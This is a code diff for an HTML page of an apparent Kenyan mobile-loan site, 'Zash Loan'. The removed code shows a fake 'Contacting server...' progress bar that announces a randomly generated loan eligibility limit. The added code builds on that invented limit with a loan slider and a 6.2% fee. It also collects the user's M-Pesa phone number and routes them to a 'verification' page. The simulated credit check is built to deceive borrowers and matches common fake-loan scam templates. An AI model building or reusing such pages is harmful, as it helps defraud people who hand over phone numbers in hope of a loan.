@@ -3,61 +3,108 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Checking Limit - Zash Loan</title>
+  <title>Loan Application - Zash Loan</title>
   <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-gradient-to-br from-red-700 via-red-600 to-red-400 min-h-screen flex items-center justify-center text-white font-sans">
+<body class="bg-gradient-to-br from-red-700 via-red-600 to-red-400 min-h-screen text-white font-sans">
 
-  <div id="loader" class="text-center space-y-4">
-    <img src="zashlogo.jpeg" alt="Zash Logo" class="w-16 h-16 mx-auto rounded-full"/>
-    <h2 class="text-xl font-semibold">Contacting server...</h2>
-    <p class="text-lg font-mono" id="percent">0%</p>
-    <div class="w-64 mx-auto bg-white bg-opacity-20 rounded-full h-3">
-      <div id="progressBar" class="bg-yellow-400 h-3 rounded-full transition-all duration-200"></div>
-    </div>
+  <!-- Header -->
+  <div class="p-4 flex items-center gap-3">
+    <img src="zashlogo.jpeg" alt="Zash Logo" class="w-12 h-12 rounded-full object-cover"/>
+    <h1 class="text-2xl font-bold">Zash Loan</h1>
   </div>
 
-  <div id="result" class="hidden text-center space-y-6">
-    <img src="zashlogo.jpeg" alt="Zash Logo" class="w-16 h-16 mx-auto rounded-full"/>
-    <h2 class="text-2xl font-bold">Congratulations!</h2>
-    <p class="text-lg">You are eligible for a loan up to:</p>
-    <p class="text-3xl font-extrabold text-yellow-300" id="limitAmount"></p>
-    <button onclick="proceed()" class="bg-yellow-400 text-black px-6 py-2 rounded font-semibold hover:bg-yellow-300 transition">
+  <!-- Main Content -->
+  <div class="max-w-md mx-auto p-6 space-y-6 bg-white bg-opacity-10 rounded-xl shadow-md backdrop-blur-sm">
+
+    <h2 class="text-2xl font-bold text-center">Choose Loan Amount</h2>
+
+    <!-- Loan Limit Info -->
+    <div class="text-center text-yellow-300 text-lg">
+      Max Limit: Ksh <span id="maxLoan">0</span>
+    </div>
+
+    <!-- Slider -->
+    <input type="range" id="loanSlider" class="w-full accent-yellow-400" min="1000" step="100"/>
+
+    <!-- Breakdown -->
+    <div class="space-y-1 text-sm">
+      <p>Loan Amount: <span class="font-semibold" id="loanAmount">Ksh 0</span></p>
+      <p>Service Fee (6.2%): <span class="font-semibold" id="feeAmount">Ksh 0</span></p>
+      <p>Total Payable: <span class="font-semibold text-yellow-300" id="totalPayable">Ksh 0</span></p>
+    </div>
+
+    <!-- Phone -->
+    <div>
+      <label class="block mb-1 text-sm">M-Pesa Phone Number</label>
+      <input type="tel" id="phone" class="w-full bg-transparent border-b border-white focus:outline-none text-white placeholder-gray-200" placeholder="07XXXXXXXX"/>
+    </div>
+
+    <!-- Due Date -->
+    <div>
+      <label class="block mb-1 text-sm">Due Date</label>
+      <input type="date" id="dueDate" class="w-full bg-transparent border-b border-white focus:outline-none text-white"/>
+    </div>
+
+    <!-- Promo -->
+    <div>
+      <label class="block mb-1 text-sm">Promo Code (Optional)</label>
+      <input type="text" id="promo" class="w-full bg-transparent border-b border-white focus:outline-none text-white placeholder-gray-300" placeholder="Enter code"/>
+    </div>
+
+    <!-- Continue -->
+    <button onclick="continueToVerify()" class="w-full bg-yellow-400 text-black font-bold py-2 mt-4 rounded hover:bg-yellow-300 transition">
       Continue
     </button>
   </div>
 
   <script>
-    let progress = 0;
-    const percent = document.getElementById("percent");
-    const progressBar = document.getElementById("progressBar");
-    const loader = document.getElementById("loader");
-    const result = document.getElementById("result");
-    const limitAmount = document.getElementById("limitAmount");
+    const loanData = JSON.parse(localStorage.getItem("loanData")) || {};
+    const maxLoan = loanData.amount || 5000;
 
-    const interval = setInterval(() => {
-      if (progress >= 100) {
-        clearInterval(interval);
-        loader.classList.add("hidden");
-        result.classList.remove("hidden");
+    const maxLoanEl = document.getElementById("maxLoan");
+    const loanSlider = document.getElementById("loanSlider");
+    const loanAmountEl = document.getElementById("loanAmount");
+    const feeAmountEl = document.getElementById("feeAmount");
+    const totalPayableEl = document.getElementById("totalPayable");
 
-        // Random loan limit between 2500 and 12000
-        const randomLimit = Math.floor(Math.random() * (12000 - 2500 + 1)) + 2500;
-        limitAmount.innerText = `Ksh ${randomLimit.toLocaleString()}`;
+    maxLoanEl.textContent = maxLoan.toLocaleString();
+    loanSlider.max = maxLoan;
+    loanSlider.value = maxLoan;
 
-        // Save to localStorage
-        localStorage.setItem("loanData", JSON.stringify({ amount: randomLimit }));
-      } else {
-        progress += Math.floor(Math.random() * 10) + 5;
-        if (progress > 100) progress = 100;
-        percent.innerText = `${progress}%`;
-        progressBar.style.width = `${progress}%`;
+    function updateLoanDetails() {
+      const loanValue = parseInt(loanSlider.value);
+      const serviceFee = Math.round(loanValue * 0.062);
+      const total = loanValue + serviceFee;
+
+      loanAmountEl.textContent = `Ksh ${loanValue.toLocaleString()}`;
+      feeAmountEl.textContent = `Ksh ${serviceFee.toLocaleString()}`;
+      totalPayableEl.textContent = `Ksh ${total.toLocaleString()}`;
+    }
+
+    loanSlider.addEventListener("input", updateLoanDetails);
+    updateLoanDetails();
+
+    function continueToVerify() {
+      const phone = document.getElementById("phone").value;
+      const dueDate = document.getElementById("dueDate").value;
+      const promo = document.getElementById("promo").value;
+      const amount = parseInt(loanSlider.value);
+      const serviceFee = Math.round(amount * 0.062);
+      const total = amount + serviceFee;
+
+      if (!phone || !dueDate) {
+        alert("Please enter phone number and due date.");
+        return;
       }
-    }, 200);
 
-    function proceed() {
-      window.location.href = "loan.html";
+      localStorage.setItem("loanRequest", JSON.stringify({
+        phone, dueDate, promo, amount, serviceFee, total
+      }));
+
+      window.location.href = "verification.html";
     }
   </script>
+
 </body>
 </html>
